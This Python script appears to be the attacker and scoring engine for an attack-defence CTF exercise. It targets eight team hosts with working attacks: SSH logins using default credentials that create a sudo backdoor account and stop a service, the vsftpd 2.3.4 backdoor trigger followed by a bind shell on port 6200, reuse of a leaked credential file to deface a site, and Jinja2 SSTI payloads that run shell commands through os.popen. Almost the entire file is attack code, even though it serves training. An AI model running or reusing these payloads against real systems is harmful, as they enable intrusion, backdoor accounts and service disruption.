import time
from time import sleep
import requests
import threading
import warnings
warnings.filterwarnings('ignore')
from telnetlib import Telnet
import argparse
import sys
import time

import m1_brute

scoreboard = "localhost"

teams = {
	1: "47.245.32.239",
	2: "47.245.42.7",
	3: "47.74.7.149",
	4: "47.245.58.155",
	5: "47.245.4.82",
	6: "47.245.56.27",
	7: "47.74.45.165",
	8: "47.91.30.23",
}

def sleep_until(t):
	print("============================")
	time.sleep(t)


def chk_alive(team):
	team = int(team)
	q = "http://" + teams[team]
	try:
		r = requests.get(q, timeout=2)
		print("team", team, "is alive: ",q)
		return True
	except:
		print("\033[31mteam", team, "is dead: ",q,"\033[0m")
		return False

# スコアの加算は「http://IP/add?team=ID&score=SCORE」で行う
def add_score(team, points):
	team = str(team)
	points = str(points)
	try:
		q = "http://" + scoreboard + "/add?team=" + team + "&score=" + points
		requests.get(q)
		print("team", team, "got points:", points)
	except:
		pass

def brute_force(team_id):
	cmd = 'echo {} | sudo -S useradd sg && echo "sg:sg" | sudo chpasswd && sudo usermod -aG sudo sg'
	res = []
	res.append(m1_brute.sshc(team_id, teams[team_id], "root", "root", cmd.format("root")))
	res.append(m1_brute.sshc(team_id, teams[team_id], "user11", "pass", cmd.format("pass")))
	res.append(m1_brute.sshc(team_id, teams[team_id], "user1", "user1", cmd.format("user2")))
	res.append(m1_brute.sshc(team_id, teams[team_id], "user6", "user6", cmd.format("user6")))
	m1_brute.sshc(team_id, teams[team_id], "sg", "sg", "echo sg | sudo -S systemctl stop http-flask.service")
	if True in res:
		return
	else:
		add_score(team_id, 50) # SSHのブルートフォースによる攻撃を防いだ
	if chk_alive(team_id):
		add_score(team_id, 50) # WEBサーバーを停止されなかった

def run(team_id, host, lp):
	portFTP = "21"
	user = "USER ayato:)"
	password = "PASS pass"
	time.sleep(2)
	try:
		tn = Telnet(host,portFTP,3)
		time.sleep(1)
		tn.read_until(b"(vsFTPd 2.3.4)")
		tn.write(user.encode('ascii') + b"\n")
		tn.read_until(b"password.")
		tn.write(password.encode('ascii') + b"\n")
		tn.close()
		print("\033[31mteam",team_id, host, "vsftpd was hacked: connected\033[0m")
	except:
		print("team", team_id, host, "vsftpd was not hacked")
		add_score(team_id, 50) # vsftpdの脆弱性を利用した接続を防いだ
	try:
		time.sleep(5)
		tn2 = Telnet(host, lp, 3)
		tn2.write(b'sudo useradd test\n')
		print("\033[31mteam",team_id, host, "vsftpd was hacked: created `test` user\033[0m")
	except:
		print("team", team_id, host, "vsftpd was not hacked")
		add_score(team_id, 100) # vsftpdの脆弱性を利用した攻撃を防いだ

def cred_attack(team_id):
	u = "http://" + teams[team_id] + ":8080/README.md"
	try:
		res = requests.get(u, timeout=(3, 7))
		if res.status_code == 200:
			print("\033[31mteam", team_id, "has credential file: ", u,"\033[0m")
			r = m1_brute.sshc(team_id, teams[team_id], "dev", "devpass123", "echo devpass123 | sudo -S sh -c 'echo hacked > /var/www/html/hacked'")
			if r == True:
				print("\033[31mteam", team_id, "was hacked:", u.replace("README.md", "hacked"), "\033[0m")
			else:
				add_score(team_id, 100) # クレデンシャル情報が流出したが、不正な通信がおこらなかった
				print("team", team_id, "could not get hacked")
		else:
			add_score(team_id, 150) # クレデンシャル情報が流出しなかった
			print("team", team_id, "has no credential file: ", u)
	except:
		add_score(team_id, 150) # クレデンシャル情報が流出しなかった
		print("team", team_id, "could not get credentials")

def web_attack(team_id):
	url = "http://" + teams[team_id]
	uri = '/app?name={{request.application.__globals__.__builtins__.__import__("os").popen("whoami").read()}}'
	q = (url + uri)
	try:
		res = requests.get(q, timeout=(3, 7))
		if res.status_code == 200:
			if "root" in res.text:
				print("\033[31mteam", team_id, "has SSTI 1:", url, "\033[0m")
			else:
				add_score(team_id, 100) # SSTIが発生しなかった
	except:
		print("team", team_id, "could not connect:", url)
		return 
	uri = """/app?name={{request.application.__globals__.__builtins__.__import__("os").popen("systemctl%20stop%20http-flask.service").read()}}"""
	q = (url + uri)
	print(q)
	try:
		res = requests.get(q, timeout=(3, 7))
		if res.status_code == 200:
			if requests.get(url, timeout=(3, 7)): # 疎通チェック
				print("\033[31mteam", team_id, "has SSTI 2:", url, "\033[0m") # SSTIが発生しサーバーがダウンした
			else:
				add_score(team_id, 100) # SSTIが発生しなかった
	except:
		print("team", team_id, "could not connect:", url)

if __name__ == "__main__":
	#ブルートフォース攻撃のテスト
	sleep_until(60 * 10 /2)
	for i in range(1, 9):
		threading.Thread(target=brute_force, args=(i,)).start()

	# vsftpdの脆弱性を利用した攻撃
	sleep_until(60 * 10 /2)
	for i in range(1, 9):
		threading.Thread(target=run, args=(i, teams[i],6200)).start()

	# クレデンシャル情報の流出
	sleep_until(60 * 5 /2)
	for i in range(1, 9):
		threading.Thread(target=cred_attack, args=(i,)).start()

	# WEBアプリへの攻撃
	sleep_until(60 * 5 /2)
	for i in range(1, 9):
		threading.Thread(target=web_attack, args=(i,)).start()

